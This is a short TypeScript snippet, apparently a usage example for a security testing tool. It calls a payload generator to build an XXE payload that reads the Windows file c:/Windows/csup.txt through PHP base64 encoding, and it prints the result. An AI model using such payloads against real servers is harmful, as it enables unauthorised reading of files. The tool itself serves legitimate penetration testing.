import { PayloadGenerator, Type, Mode, Encoding } from "./PayloadGenerator";
import { Requester } from "./Requester";
const gen = new PayloadGenerator();
const p = gen.generate(Type.file, Mode.XML, Encoding.PHP_BASE64, "/c:/Windows/csup.txt", "<root>{{XXE}}</root>");
console.log(p);